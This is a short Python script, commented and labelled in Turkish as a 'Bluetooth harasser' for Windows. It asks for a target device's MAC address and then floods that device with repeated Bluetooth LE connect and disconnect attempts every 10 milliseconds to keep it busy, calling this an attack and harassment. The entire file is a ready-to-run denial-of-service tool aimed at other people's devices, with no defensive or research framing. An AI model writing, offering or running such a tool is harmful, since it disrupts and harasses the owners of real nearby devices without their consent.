import asyncio
from bleak import BleakClient

print("--- BLUETOOTH TACİZCİSİ (WINDOWS) ---")
# Kopyaladığın MAC adresini buraya yapıştıracaksın
target_address = input("Hedef MAC Adresini Yapıştır: ")

print(f"🔥 {target_address} cihazına sürekli bağlantı isteği atılıyor...")
print("Durdurmak için CTRL+C yapabilirsin.")

async def flood_connect():
    while True:
        try:
            print(f"[*] Bağlanılıyor...")
            # Cihaza bağlanmaya çalış (Bu onu meşgul eder)
            async with BleakClient(target_address, timeout=1.0) as client:
                print(f"[+] BAĞLANDI! (Hedef cihaz şu an meşgul)")
                # Hemen bağlantıyı kopar ki tekrar bağlanabilelim
                await client.disconnect()
        except Exception as e:
            # Bağlanamazsa bile (reddedilirse) bu da bir tacizdir
            print(f"[-] İstek reddedildi veya cihaz meşgul (Saldırı devam ediyor)")
            
        # Çok hızlı döngüye sok
        await asyncio.sleep(0.01)

try:
    asyncio.run(flood_connect())
except KeyboardInterrupt:
    print("\nSaldırı durduruldu.")
except Exception as e:
    print(f"Hata: {e}")